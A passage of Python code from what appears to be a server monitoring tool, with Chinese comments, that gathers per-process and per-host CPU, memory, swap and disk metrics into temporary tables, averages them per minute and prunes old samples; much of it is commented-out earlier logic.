                                                                                    process_id=process_id):
                        disk_insert_data.append(disk_info)

                    # 收集进程CPU使用率
                    # CPU使用率大于0时才收集
                    if realtime_data['cpu_percent'] > 0 and not self.sampling_closed('cpu', process_id=process_id):
                        cpu_insert_data.append({
                            'process_id': process_id,
                            'percent': realtime_data['cpu_percent'],
                        })

                    # 收集进程内存信息
                    if not self.sampling_closed('mem', process_id=process_id):
                        mem_insert_data.append({
                            'process_id': process_id,
                            'percent': realtime_data['mem_percent'],
                            'used': realtime_data['mem_used'],
                        })

                    # 收集进程打开文件数
                    # 文件打开数大于0时才收集
                    if insert_data['opened_files'] > 0 and not self.sampling_closed('opened_files',
                                                                                    process_id=process_id):
                        opened_files_insert_data.append({
                            'process_id': process_id,
                            'opened_files': insert_data['opened_files'],
                        })

                    # 收集进程网络连接数
                    # 网络连接数大于0时才收集
                    # if insert_data['opened_connections'] > 0:
                    #     opened_connections_insert_data.append({
                    #         'process_id': process_id,
                    #         'opened_connections': insert_data['opened_connections']
                    #     })

                    # 收集进程打开线程数
                    # 线程数大于1时才收集
                    if insert_data['opened_threads'] > 1 and not self.sampling_closed('opened_threads',
                                                                                  process_id=process_id):
                        opened_threads_insert_data.append({
                            'process_id': process_id,
                            'opened_threads': insert_data['opened_threads']
                        })

                # 将进程实时信息写入缓存
                self.cache_realtime_proc_info(
                    process_id=process_id,
                    cpu_percent=realtime_data['cpu_percent'],
                    mem_percent=realtime_data['mem_percent'],
                    mem_used=realtime_data['mem_used'],
                    disk_read_per_second=disk_info['read_bytes_per_second'],
                    disk_write_per_second=disk_info['write_bytes_per_second']
                )

                # 统计各状态进程数
                # process_infos_insert_data['total'] += 1

                # 获取进程状态
                # process_status = insert_data['status'].lower()

                # 统计对应状态的进程数
                # if process_status in process_infos_insert_data:
                #     process_infos_insert_data[process_status] += 1
            # e = time.time()
            # public.print_log("--存储进程耗时: {}".format(e-s))
        except BaseException as e:
            # 记录异常堆栈
            public.print_exc_stack(e)

            return False

        # 更新进程名称与启动路径
        self.__PROCESS_NAME_EXE_QUEUE.put_nowait(pne_insert_data)
        # self.db_easy('process_name_exe')\
        #         .insert_all(pne_insert_data, option='replace', blocking=False)

        # 将数据写入临时表
        with self.__DB_MEMORY as db:
            # 批量插入进程磁盘IO收集信息
            if len(disk_insert_data) > 0:
                db.query() \
                    .name('process_disk_io_info_list') \
                    .insert_all(disk_insert_data, blocking=False)

            # 批量插入进程CPU占用收集信息
            if len(cpu_insert_data) > 0:
                db.query() \
                    .name('process_cpu_info_list') \
                    .insert_all(cpu_insert_data, blocking=False)
            # public.print_log('222临时表 --- 插入进程CPU占用收集信息')


            # 批量插入进程内存占用收集信息
            if len(mem_insert_data) > 0:
                db.query() \
                    .name('process_mem_info_list') \
                    .insert_all(mem_insert_data, blocking=False)

            # 批量插入进程打开文件数收集信息
            if len(opened_files_insert_data) > 0:
                db.query() \
                    .name('process_opened_files_info_list') \
                    .insert_all(opened_files_insert_data, blocking=False)

            # 批量插入进程网络连接数收集信息
            if len(opened_connections_insert_data) > 0:
                db.query() \
                    .name('process_opened_connections_info_list') \
                    .insert_all(opened_connections_insert_data, blocking=False)

            # 批量插入进程线程数收集信息
            if len(opened_threads_insert_data) > 0:
                db.query() \
                    .name('process_opened_threads_info_list') \
                    .insert_all(opened_threads_insert_data, blocking=False)

            # # 插入各状态进程统计数据
            # db.query()\
            #     .name('server_process_info_list')\
            #     .insert(process_infos_insert_data)

        # 回收内存
        del (pne_insert_data,
             disk_insert_data,
             cpu_insert_data,
             mem_insert_data,
             opened_files_insert_data,
             opened_threads_insert_data,
             opened_connections_insert_data,)

        # # 根据磁盘写入间隔写入数据
        # time_line = cur_time - (self.__DISK_WRITE_PER_MINUTES * 60)
        # save_time_line = cur_time - 240
        # save_time_line_normal = cur_time - 60
        # last_store_time = self.__PROCESS_INFO_LAST_STORE_TIME.get(sid, 0)

        # 插入
        # if last_store_time == 0:
        #     self.__PROCESS_INFO_LAST_STORE_TIME[sid] = cur_time
        # if self.__PROCESS_INFO_LAST_STORE_TIME.get(sid, 0) < time_line:
        #     # 记录本次进程信息存储时间
        #     self.__PROCESS_INFO_LAST_STORE_TIME[sid] = cur_time
        #
        #     # 获取该主机10分钟内所有进程信息
        #     processes_memory = self.db_memory('processes') \
        #         .where('`sid` = ?', int(sid)) \
        #         .where('update_time > ?', cur_time - 600) \
        #         .limit(500) \
        #         .select()
        #
        #     process_id_list = [str(p['id']) for p in processes_memory]
        #
        #     process_id_list_str = ','.join(process_id_list)
        #
        #     # 清空十分钟前所有非活跃进程网络IO收集数据
        #     # 释放内存
        #     sub_sql = self.db_memory('processes') \
        #         .where('sid=?', sid) \
        #         .where('create_time <= ?', cur_time - 600) \
        #         .field('id') \
        #         .build_sql(True)
        #
        #     self.db_memory('process_network_io_info_list') \
        #         .where('process_id IN ({})'.format(sub_sql)) \
        #         .delete()
        #
        #     self.db_easy('processes').insert_all(processes_memory, option='replace', blocking=False)
        #
        #     disk_insert_data = []
        #
        #     # 进程CPU使用率收集批量插入数据
        #     cpu_insert_data = []
        #
        #     # 进程内存占用信息收集批量插入数据
        #     mem_insert_data = []
        #
        #     # 进程文件打开数收集批量插入数据
        #     opened_files_insert_data = []
        #
        #     # 进程网络连接数收集批量插入数据
        #     opened_connections_insert_data = []
        #
        #     # 进程线程数收集批量插入数据
        #     opened_threads_insert_data = []
        #
        #     # 各状态进程数量收集批量插入数据
        #     # process_infos_insert_data = []
        #
        #     # 打开临时数据库
        #     with self.__DB_MEMORY as db:
        #         # 计算进程磁盘IO平均信息
        #         cnt = db.query() \
        #             .name('process_disk_io_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time>=?', time_line) \
        #             .group('process_id')\
        #             .field('process_id', 'count(*) as `cnt`')\
        #             .select()
        #
        #         for item in cnt:
        #             if item['cnt'] == 0:
        #                 continue
        #
        #             # sub_query = db.query() \
        #             #     .name('process_disk_io_info_list') \
        #             #     .where('process_id', item['process_id']) \
        #             #     .where('create_time>=?', time_line) \
        #             #     .order('`read_bytes_per_second` + `write_bytes_per_second`', 'DESC')\
        #             #     .limit(20) \
        #             #     .build_sql(True)
        #             #
        #             # i_data = db.query() \
        #             #     .from_sub_query(sub_query) \
        #             #     .field('process_id', 'round(avg(`read_bytes_per_second`)) as `read_bytes_per_second`',
        #             #            'round(avg(`write_bytes_per_second`)) as `write_bytes_per_second`') \
        #             #     .find()
        #
        #             # 获取最近的20个磁盘IO样本
        #             samples_query = db.query() \
        #                 .name('process_disk_io_info_list') \
        #                 .where('process_id', item['process_id']) \
        #                 .where('create_time>=?', time_line) \
        #                 .order('`read_bytes_per_second` + `write_bytes_per_second`', 'DESC') \
        #                 .select()
        #
        #             samples = list(samples_query)
        #             # 根据每分钟区间内的数据计算平均值
        #             for i in samples:
        #                 i['time_slot'] = int(i['create_time'] / 60)
        #
        #             rsamples = self.get_average_minute(samples, 'read_bytes_per_second')
        #             wsamples = self.get_average_minute(samples, 'write_bytes_per_second')
        #
        #             # 计算第一次均值
        #             read_values = [s['read_bytes_per_second'] for s in rsamples]
        #             write_values = [s['write_bytes_per_second'] for s in wsamples]
        #             avg2_read = self.get_average(read_values)
        #             avg2_write = self.get_average(write_values)
        #
        #             # avg1_read = sum(read_values) / 20
        #             # avg1_write = sum(write_values) / 20
        #             #
        #             # # 计算第二次均值
        #             # read_values_above_avg1 = [v for v in read_values if v >= avg1_read]
        #             # write_values_above_avg1 = [v for v in write_values if v >= avg1_write]
        #             # avg2_read = sum(read_values_above_avg1) / len(
        #             #     read_values_above_avg1) if read_values_above_avg1 else avg1_read
        #             # avg2_write = sum(write_values_above_avg1) / len(
        #             #     write_values_above_avg1) if write_values_above_avg1 else avg1_write
        #
        #             # 将结果存储在`i_data`变量中
        #             i_data = {
        #                 'process_id': item['process_id'],
        #                 'read_bytes_per_second': round(avg2_read),
        #                 'write_bytes_per_second': round(avg2_write)
        #             }
        #             disk_insert_data.append(i_data)
        #
        #         # 删除临时数据
        #         db.query() \
        #             .name('process_disk_io_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time<?', save_time_line_normal) \
        #             .delete()
        #
        #         # 计算进程CPU使用率平均信息
        #         cnt = db.query() \
        #             .name('process_cpu_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time>=?', time_line) \
        #             .group('process_id')\
        #             .field('process_id', 'count(*) as `cnt`')\
        #             .select()
        #
        #         # for item in cnt:
        #         #     if item['cnt'] == 0:
        #         #         continue
        #         #
        #         #     sub_query = db.query() \
        #         #         .name('process_cpu_info_list') \
        #         #         .where('process_id', item['process_id']) \
        #         #         .where('create_time>=?', time_line) \
        #         #         .order('percent', 'DESC') \
        #         #         .limit(20) \
        #         #         .build_sql(True)
        #         #
        #         #     i_data = db.query() \
        #         #         .from_sub_query(sub_query) \
        #         #         .field('process_id', 'round(avg(`percent`),2) as `percent`') \
        #         #         .find()
        #         #     cpu_insert_data.append(i_data)
        #
        #         for item in cnt:
        #             if item['cnt'] == 0:
        #                 continue
        #             # 获取最近的20个CPU使用率样本
        #             samples_query = db.query() \
        #                 .name('process_cpu_info_list') \
        #                 .where('process_id', item['process_id']) \
        #                 .where('create_time>=?', time_line) \
        #                 .order('percent', 'DESC') \
        #                 .select()
        #
        #             samples = list(samples_query)
        #             for i in samples:
        #                 i['time_slot'] = int(i['create_time'] / 60)
        #
        #             samples = self.get_average_minute(samples, 'percent')
        #             # 计算第一次均值
        #             values = [s['percent'] for s in samples]
        #             avg2 = self.get_average(values)
        #             # avg1 = sum(values) / 20
        #             #
        #             # # 计算第二次均值
        #             # values_above_avg1 = [v for v in values if v >= avg1]
        #             # avg2 = sum(values_above_avg1) / len(values_above_avg1) if values_above_avg1 else avg1
        #
        #             # 将结果存储在`i_data`变量中
        #             i_data = {
        #                 'process_id': item['process_id'],
        #                 'percent': round(avg2, 2)
        #             }
        #             cpu_insert_data.append(i_data)
        #
        #         # 删除临时数据
        #         db.query() \
        #             .name('process_cpu_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time<?', save_time_line_normal) \
        #             .delete()
        #
        #         # 计算进程内存占用平均信息
        #         cnt = db.query() \
        #             .name('process_mem_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time>=?', time_line) \
        #             .group('process_id')\
        #             .field('process_id', 'count(*) as `cnt`')\
        #             .select()
        #
        #         #     # offset = int(0.2 * item['cnt'])
        #         #
        #         #     sub_query = db.query() \
        #         #         .name('process_mem_info_list') \
        #         #         .where('process_id', item['process_id']) \
        #         #         .where('create_time>=?', time_line) \
        #         #         .order('`percent`', 'DESC') \
        #         #         .limit(20) \
        #         #         .build_sql(True)
        #         #
        #         #     i_data = db.query() \
        #         #         .from_sub_query(sub_query) \
        #         #         .field('process_id', 'round(avg(`percent`),2) as `percent`', 'round(avg(`used`)) as `used`') \
        #         #         .find()
        #         #
        #         #     mem_insert_data.append(i_data)
        #
        #         for item in cnt:
        #             if item['cnt'] == 0:
        #                 continue
        #
        #             sub_query = db.query() \
        #                 .name('process_mem_info_list') \
        #                 .where('process_id', item['process_id']) \
        #                 .where('create_time>=?', time_line) \
        #                 .order('`percent`', 'DESC') \
        #                 .build_sql(True)
        #
        #             # 获取最近的20个内存占用样本
        #             samples_query = db.query() \
        #                 .from_sub_query(sub_query) \
        #                 .select()
        #
        #             samples = list(samples_query)
        #             for i in samples:
        #                 i['time_slot'] = int(i['create_time'] / 60)
        #
        #             psamples = self.get_average_minute(samples, 'percent')
        #             usamples = self.get_average_minute(samples, 'used')
        #
        #             percent_values = [s['percent'] for s in psamples]
        #             used_values = [s['used'] for s in usamples]
        #             # 确保进程内存占用不会超过100
        #             avg2_percent = 95.9 if self.get_average(percent_values) >= 100 else self.get_average(percent_values)
        #             avg2_used = self.get_average(used_values)
        #
        #             # avg1_percent = sum(percent_values) / 20
        #             # avg1_used = sum(used_values) / 20
        #             #
        #             # # 计算第二次均值
        #             # percent_values_above_avg1 = [v for v in percent_values if v >= avg1_percent]
        #             # used_values_above_avg1 = [v for v in used_values if v >= avg1_used]
        #             # avg2_percent = sum(percent_values_above_avg1) / len(
        #             #     percent_values_above_avg1) if percent_values_above_avg1 else avg1_percent
        #             # avg2_used = sum(used_values_above_avg1) / len(
        #             #     used_values_above_avg1) if used_values_above_avg1 else avg1_used
        #
        #             # 将结果存储在`i_data`变量中
        #             i_data = {
        #                 'process_id': item['process_id'],
        #                 'percent': round(avg2_percent, 2),
        #                 'used': round(avg2_used)
        #             }
        #             mem_insert_data.append(i_data)
        #
        #         # 删除临时数据
        #         db.query() \
        #             .name('process_mem_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time<?', save_time_line) \
        #             .delete()
        #
        #         # 计算进程文件打开数平均信息
        #         cnt = db.query() \
        #             .name('process_opened_files_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time>=?', time_line) \
        #             .group('process_id') \
        #             .field('process_id', 'count(*) as `cnt`')\
        #             .select()
        #
        #         for item in cnt:
        #             if item['cnt'] == 0:
        #                 continue
        #
        #             # offset = int(0.2 * item['cnt'])
        #
        #             # sub_query = db.query() \
        #             #     .name('process_opened_files_info_list') \
        #             #     .where('process_id', item['process_id']) \
        #             #     .where('create_time>=?', time_line) \
        #             #     .limit(20) \
        #             #     .build_sql(True)
        #             #
        #             # i_data = db.query() \
        #             #     .from_sub_query(sub_query) \
        #             #     .field('process_id', 'round(avg(`opened_files`)) as `opened_files`') \
        #             #     .find()
        #
        #             samples_query = db.query() \
        #                 .name('process_opened_files_info_list') \
        #                 .where('process_id', item['process_id']) \
        #                 .where('create_time>=?', time_line) \
        #                 .order('`opened_files`', 'DESC') \
        #                 .select()
        #
        #             samples = list(samples_query)
        #             for i in samples:
        #                 i['time_slot'] = int(i['create_time'] / 60)
        #
        #             samples = self.get_average_minute(samples, 'opened_files')
        #             # 计算第一次均值
        #             values = [s['opened_files'] for s in samples]
        #             avg2 = self.get_average(values)
        #             # avg1 = sum(values) / 20
        #             #
        #             # # 计算第二次均值
        #             # values_above_avg1 = [v for v in values if v >= avg1]
        #             # avg2 = sum(values_above_avg1) / len(values_above_avg1) if values_above_avg1 else avg1
        #
        #             # 将结果存储在`i_data`变量中
        #             i_data = {
        #                 'process_id': item['process_id'],
        #                 'opened_files': round(avg2)
        #             }
        #             opened_files_insert_data.append(i_data)
        #
        #         # 删除临时数据
        #         db.query() \
        #             .name('process_opened_files_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time<?', save_time_line_normal) \
        #             .delete()
        #
        #         # # 计算进程网络连接数平均信息
        #         # cnt = db.query() \
        #         #     .name('process_opened_connections_info_list') \
        #         #     .where('process_id IN ({})'.format(process_id_list_str)) \
        #         #     .where('create_time>=?', time_line) \
        #         #     .count()
        #         #
        #         # offset = int(0.2 * cnt)
        #         #
        #         # sub_query = db.query() \
        #         #     .name('process_opened_connections_info_list') \
        #         #     .where('process_id IN ({})'.format(process_id_list_str)) \
        #         #     .where('create_time>=?', time_line) \
        #         #     .order('opened_connections', 'DESC') \
        #         #     .limit(10, offset) \
        #         #     .build_sql(True)
        #         #
        #         # opened_connections_insert_data = db.query() \
        #         #     .from_sub_query(sub_query) \
        #         #     .group('process_id') \
        #         #     .having('`opened_connections` > 0') \
        #         #     .field('process_id', 'round(avg(`opened_connections`)) as `opened_connections`') \
        #         #     .select()
        #         #
        #         # # 删除临时数据
        #         # db.query() \
        #         #     .name('process_opened_connections_info_list') \
        #         #     .where('process_id IN ({})'.format(process_id_list_str)) \
        #         #     .where('create_time<?', save_time_line_normal) \
        #         #     .delete()
        #
        #         # 计算进程线程数平均信息
        #         cnt = db.query() \
        #             .name('process_opened_threads_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time>=?', time_line) \
        #             .group('process_id') \
        #             .field('process_id', 'count(*) as `cnt`')\
        #             .select()
        #         # 计算进程线程数平均信息
        #         for item in cnt:
        #             if item['cnt'] == 0:
        #                 continue
        #
        #             # offset = int(0.2 * item['cnt'])
        #
        #             # sub_query = db.query() \
        #             #     .name('process_opened_threads_info_list') \
        #             #     .where('process_id', item['process_id']) \
        #             #     .where('create_time>=?', time_line) \
        #             #     .order('opened_threads', 'DESC') \
        #             #     .limit(20) \
        #             #     .build_sql(True)
        #             #
        #             # i_data = db.query() \
        #             #     .from_sub_query(sub_query) \
        #             #     .field('process_id', 'round(avg(`opened_threads`)) as `opened_threads`') \
        #             #     .find()
        #
        #             samples_query = db.query() \
        #                 .name('process_opened_threads_info_list') \
        #                 .where('process_id', item['process_id']) \
        #                 .where('create_time>=?', time_line) \
        #                 .order('opened_threads', 'DESC') \
        #                 .select()
        #
        #             samples = list(samples_query)
        #             for i in samples:
        #                 i['time_slot'] = int(i['create_time'] / 60)
        #
        #             samples = self.get_average_minute(samples, 'opened_threads')
        #
        #             # 计算第一次均值
        #             values = [s['opened_threads'] for s in samples]
        #             avg2 = self.get_average(values)
        #             # avg1 = sum(values) / 20
        #             #
        #             # # 计算第二次均值
        #             # values_above_avg1 = [v for v in values if v >= avg1]
        #             # avg2 = sum(values_above_avg1) / len(values_above_avg1) if values_above_avg1 else avg1
        #
        #             # 将结果存储在`i_data`变量中
        #             i_data = {
        #                 'process_id': item['process_id'],
        #                 'opened_threads': round(avg2)
        #             }
        #
        #             opened_threads_insert_data.append(i_data)
        #
        #         # 删除临时数据
        #         db.query() \
        #             .name('process_opened_threads_info_list') \
        #             .where('process_id IN ({})'.format(process_id_list_str)) \
        #             .where('create_time<?', save_time_line_normal) \
        #             .delete()
        #
        #         # # 计算各状态进程数平均信息
        #         # process_infos_insert_data = db.query()\
        #         #     .name('server_process_info_list')\
        #         #     .field('sid', 'round(avg(`total`)) as `total`', 'round(avg(`running`)) as `running`', 'round(avg(`stop`)) as `stop`',
        #         #            'round(avg(`sleep`)) as `sleep`', 'round(avg(`zombie`)) as `zombie`')\
        #         #     .select()
        #         #
        #         # # 删除临时数据
        #         # db.query()\
        #         #     .name('server_process_info_list')\
        #         #     .delete()
        #
        #     # 获取数据库管理对象
        #     db_mgr = monitor_db_manager.MonitorDbManager(sid)
        #
        #     # # 写入进程IO收集数据
        #     if len(disk_insert_data) > 0:
        #         db_mgr.add('process_disk_io_info_list', disk_insert_data, option='ignore')
        #
        #     # 写入CPU使用率收集数据
        #     if len(cpu_insert_data) > 0:
        #         db_mgr.add('process_cpu_info_list', cpu_insert_data, option='ignore')
        #
        #     # public.print_log('写入CPU使用率收集数据-----1234567890-')
        #     # public.print_log('写入CPU使用率收集数据-----{}-'.format(cpu_insert_data))
        #
        #     # 写入内存占用收集数据
        #     if len(mem_insert_data) > 0:
        #         db_mgr.add('process_mem_info_list', mem_insert_data, option='ignore')
        #
        #     # 写入文件打开数收集数据
        #     if len(opened_files_insert_data) > 0:
        #         db_mgr.add('process_opened_files_info_list', opened_files_insert_data, option='ignore')
        #
        #     # # 写入网络连接数收集数据
        #     # if len(opened_connections_insert_data) > 0:
        #     #     db_mgr.add('process_opened_connections_info_list', opened_connections_insert_data)
        #
        #     # 写入线程数收集数据
        #     if len(opened_threads_insert_data) > 0:
        #         db_mgr.add('process_opened_threads_info_list', opened_threads_insert_data, option='ignore')
        #
        #     # # 告警 使用最新插入的数据
        #     # from core.include.monitor_helpers import warning_obj
        #     # warning_obj.warn_assign(sid, 'service', 'cpu.percent', 'percent', cpu_insert_data, no_threshold=False)
        #     # public.print_log('经过了告警-----1234567890-')
        #     # public.print_log('经过了告警-----1234567890-')
        #     # public.print_log('经过了告警-----1234567890-')
        #
        #     # 回收内存
        #     del (disk_insert_data,
        #          cpu_insert_data,
        #          mem_insert_data,
        #          opened_files_insert_data,
        #          opened_connections_insert_data,)

        return ret_flag

    # 同步插入 基础数据和进程数据
    def sync_insert_base_and_process_data(self):
        from core.include.monitor_helpers import warning_obj

        cur_time = int(time.time())

        # sid列表
        sids = warning_obj.db_easy('servers') \
            .where('is_authorized = 1') \
            .column('sid')

        # public.print_log('>>>> insert_systeminfo_and_process_____: {}'.format(sids), _level='error')

        for sid in sids:
            # public.print_log('>>>> insert_systeminfo_and_process: {}'.format(sid), _level='error')
            try:
                self.sync_systeminfo_process(sid, cur_time)
            except BaseException as e:
                public.print_exc_stack(e)
            finally:
                # public.print_log('>>>> insert_systeminfo_and_process: {} >> ok'.format(sid), _level='error')
                time.sleep(0.01)

        # public.print_log('>>>> insert_systeminfo_and_process_____: {} >> ok'.format(sids), _level='error')

        return True

    # 将基础监控历史数据与进程监控历史数据入库
    def sync_systeminfo_process(self, sid, cur_time):
        """
            @author Zhj<2023-08-11>
            @param sid<int>         服务器SID
            @param cur_time<int>    当前时间 Unix时间戳
            @return None
        """
        save_time_line = cur_time - 240
        save_time_line_normal = cur_time - 60

        # 查询上次记录时间
        time_line = self.__PROCESS_INFO_LAST_STORE_TIME.get(sid, 0)

        # 记录本次存储时间
        self.__PROCESS_INFO_LAST_STORE_TIME[sid] = cur_time
        # self.__SYSTEMINFO_LAST_STORE_TIME[sid] = cur_time

        # 同步 基础数据---------------

        # 主机CPU收集信息新增数据
        serv_cpu_insert_data = None

        # 主机内存收集信息新增数据
        serv_mem_insert_data = None

        # 主机swap收集信息新增数据
        serv_swap_insert_data = None

        # 主机磁盘收集信息新增数据
        serv_disk_insert_data = None

        # 主机网卡收集信息新增数据
        serv_net_insert_data = None

        # 主机负载收集信息新增数据
        serv_loadavg_insert_data = None

        # 从临时表中获取平均数据(采样时间内数据的降序前20%数据平均值)
        # cpu 平均负载 内存 SWAP 磁盘占用 磁盘IO 网络
        with self.__DB_MEMORY as db_tmp:
            # 计算cpu使用率
            # cnt = db_tmp \
            #     .query() \
            #     .name('server_cpu_info_list') \
            #     .where('sid=?', sid) \
            #     .where('create_time>=?', time_line) \
            #     .count()
            # offset = int(0.2 * cnt)

            # sub_query = db_tmp \
            #     .query() \
            #     .name('server_cpu_info_list') \
            #     .where('sid=?', sid) \
            #     .where('create_time>=?', time_line) \
            #     .order('percent', 'desc') \
            #     .build_sql(True)

            cpu_percent_samples_query = db_tmp \
                .query() \
                .name('server_cpu_info_list') \
                .where('sid', sid) \
                .where('create_time >= ?', time_line) \
                .order('percent', 'desc') \
                .select()

            cpu_percent_samples = list(cpu_percent_samples_query)
            # 根据每分钟区间内的数据计算cpu平均值
            for i in cpu_percent_samples:
                i['time_slot'] = int(i['create_time'] / 60)
            cpu_percent_samples = self.get_average_minute(cpu_percent_samples, 'percent')

            cpu_percent_values = [s['percent'] for s in cpu_percent_samples]
            avg2_cpu_percent = self.get_average(cpu_percent_values)

            # cpu平均使用大于0时记录
            if avg2_cpu_percent > 0:
                serv_cpu_insert_data = {
                    'sid': sid,
                    'percent': round(avg2_cpu_percent, 2),
                }

            # 删除临时数据
            db_tmp.query() \
                .name('server_cpu_info_list') \
                .where('sid', sid) \
                .where('create_time < ?', save_time_line) \
                .delete()

            # 计算内存平均使用率与平均占用
            # cnt = db_tmp \
            #     .query() \
            #     .name('server_mem_info_list') \
            #     .where('sid=?', sid) \
            #     .where('create_time>=?', time_line) \
            #     .count()

            # offset = int(0.2 * cnt)

            # sub_query = db_tmp \
            #     .query() \
            #     .name('server_mem_info_list') \
            #     .where('sid=?', sid) \
            #     .where('create_time>=?', time_line) \
            #     .order('percent', 'DESC') \
            #     .build_sql(True)

            mem_samples_query = db_tmp \
                .query() \
                .name('server_mem_info_list') \
                .where('sid', sid) \
                .where('create_time >= ?', time_line) \
                .order('percent', 'DESC') \
                .select()

            mem_samples = list(mem_samples_query)

            # 根据每分钟区间内的数据计算平均值
            for i in mem_samples:
                i['time_slot'] = int(i['create_time'] / 60)

            pmem_samples = self.get_average_minute(mem_samples, 'percent')
            umem_samples = self.get_average_minute(mem_samples, 'used')

            # 计算第一次均值
            mem_percent_values = [s['percent'] for s in pmem_samples]
            mem_used_values = [s['used'] for s in umem_samples]
            avg2_mem_percent = self.get_average(mem_percent_values)
            avg2_mem_used = self.get_average(mem_used_values)

            # 内存平均使用率或平均占用大于0时记录
            if avg2_mem_percent > 0 or avg2_mem_used > 0:
                serv_mem_insert_data = {
                    'sid': sid,
                    'percent': round(avg2_mem_percent, 2),
                    'used': round(avg2_mem_used),
                }

            # 删除临时数据
            db_tmp.query() \
                .name('server_mem_info_list') \
                .where('sid', sid) \
                .where('create_time < ?', save_time_line) \
                .delete()

            # 计算swap平均使用率与平均占用
            # cnt = db_tmp \
            #     .query() \
            #     .name('server_swap_info_list') \
            #     .where('sid=?', sid) \
            #     .where('create_time >= ?', time_line) \
            #     .count()

            # offset = int(0.2 * cnt)

            # sub_query = db_tmp \
            #     .query() \
            #     .name('server_swap_info_list') \
            #     .where('sid', sid) \
            #     .where('create_time >= ?', time_line) \
            #     .order('percent', 'DESC') \
            #     .build_sql(True)

            swap_samples_query = db_tmp \
                .query() \
                .name('server_swap_info_list') \
                .where('sid', sid) \
                .where('create_time >= ?', time_line) \
                .order('percent', 'DESC') \
                .select()

            swap_samples = list(swap_samples_query)
            # 根据每分钟区间内的数据计算平均值
            for i in swap_samples:
                i['time_slot'] = int(i['create_time'] / 60)

            pswap_samples = self.get_average_minute(swap_samples, 'percent')
            uswap_samples = self.get_average_minute(swap_samples, 'used')

            # 计算第一次均值
            swap_percent_values = [s['percent'] for s in pswap_samples]
            swap_used_values = [s['used'] for s in uswap_samples]
            avg2_swap_percent = self.get_average(swap_percent_values)
            avg2_swap_used = self.get_average(swap_used_values)

            # swap平均使用率或平均占用大于0时记录
            if avg2_swap_percent > 0 or avg2_swap_used > 0:
                serv_swap_insert_data = {
                    'sid': sid,
                    'percent': round(avg2_swap_percent, 2),
                    'used': round(avg2_swap_used),
                }

            # 删除临时数据
            db_tmp.query() \
                .name('server_swap_info_list') \
                .where('sid', sid) \
                .where('create_time < ?', save_time_line) \
                .delete()

            # 计算磁盘IO平均信息
            cnt = db_tmp \
                .query() \
                .name('server_disk_info_list') \
                .where('sid', sid) \
                .where('create_time >= ?', time_line) \
                .order('`read_bytes_per_second` + `write_bytes_per_second`', 'desc') \
                .group('name, sid') \
                .field('name', 'sid', 'count(*) as `cnt`') \
                .select()

            serv_disk_info = []

            for item in cnt:
                if item['cnt'] == 0:
                    continue

                # offset = int(0.2 * item['cnt'])

                # sub_query = db_tmp \
                #     .query() \
                #     .name('server_disk_info_list') \
                #     .where('sid=?', sid) \
                #     .where('name', item['name']) \
                #     .where('create_time>=?', time_line) \
                #     .order('`read_bytes_per_second` + `write_bytes_per_second`', 'desc') \
                #     .build_sql(True)

                # 获取最近的磁盘IO样本
                samples_query = db_tmp \
                    .query() \
                    .name('server_disk_info_list') \
                    .where('sid', sid) \
                    .where('name', item['name']) \
                    .where('create_time >= ?', time_line) \
                    .order('`read_bytes_per_second` + `write_bytes_per_second`', 'desc') \
                    .select()

                samples = list(samples_query)
                # 根据每分钟区间内的数据计算平均值
                for i in samples:
                    i['time_slot'] = int(i['create_time'] / 60)

                usamples = self.get_average_minute(samples, 'used')
                upsamples = self.get_average_minute(samples, 'used_percent')
                iuusamples = self.get_average_minute(samples, 'inodes_used')
                iupsamples = self.get_average_minute(samples, 'inodes_used_percent')
                isamples = self.get_average_minute(samples, 'iops')
                iosamples = self.get_average_minute(samples, 'io_percent')
                rsamples = self.get_average_minute(samples, 'read_bytes_per_second')
                wsamples = self.get_average_minute(samples, 'write_bytes_per_second')

                # 计算第一次均值
                used_values = [s['used'] for s in usamples]
                used_percent_values = [s['used_percent'] for s in upsamples]
                inodes_used_values = [s['inodes_used'] for s in iuusamples]
                inodes_used_percent_values = [s['inodes_used_percent'] for s in iupsamples]
                iops_values = [s['iops'] for s in isamples]
                io_percent_values = [s['io_percent'] for s in iosamples]
                read_values = [s['read_bytes_per_second'] for s in rsamples]
                write_values = [s['write_bytes_per_second'] for s in wsamples]

                # 判断所有列表同时为空
                if not used_values and not used_percent_values and not inodes_used_values and not inodes_used_percent_values and not iops_values and not io_percent_values and not read_values and not write_values:
                    continue

                avg2_used = self.get_average(used_values)
                avg2_used_percent = self.get_average(used_percent_values)
                avg2_inodes_used = self.get_average(inodes_used_values)
                avg2_inodes_used_percent = self.get_average(inodes_used_percent_values)
                avg2_iops = self.get_average(iops_values)
                avg2_io_percent = self.get_average(io_percent_values)
                avg2_read = self.get_average(read_values)
                avg2_write = self.get_average(write_values)

                # # 将结果存储在`i_data`变量中
                # i_data = {
                #     'sid': item['sid'],
                #     'name': item['name'],
                #     'used': round(avg2_used),
                #     'used_percent': round(avg2_used_percent, 2),
                #     'inodes_used': round(avg2_inodes_used),
                #     'inodes_used_percent': round(avg2_inodes_used_percent, 2),
                #     'iops': round(avg2_iops),
                #     'io_percent': round(avg2_io_percent, 2),
                #     'read_bytes_per_second': round(avg2_read),
                #     'write_bytes_per_second': round(avg2_write)
                # }
                # if i_data is None or i_data['sid'] is None:
                #     continue
                # serv_disk_info.append(i_data)

                serv_disk_info.append({
                    'sid': item['sid'],
                    'name': item['name'],
                    'used': round(avg2_used),
                    'used_percent': round(avg2_used_percent, 2),
                    'inodes_used': round(avg2_inodes_used),
                    'inodes_used_percent': round(avg2_inodes_used_percent, 2),
                    'iops': round(avg2_iops),
                    'io_percent': round(avg2_io_percent, 2),
                    'read_bytes_per_second': round(avg2_read),
                    'write_bytes_per_second': round(avg2_write)
                })

            if len(serv_disk_info) > 0:
                serv_disk_insert_data = serv_disk_info
                serv_disk_info = None
                del (serv_disk_info,)

            # 删除临时数据
            db_tmp.query() \
                .name('server_disk_info_list') \
                .where('sid', sid) \
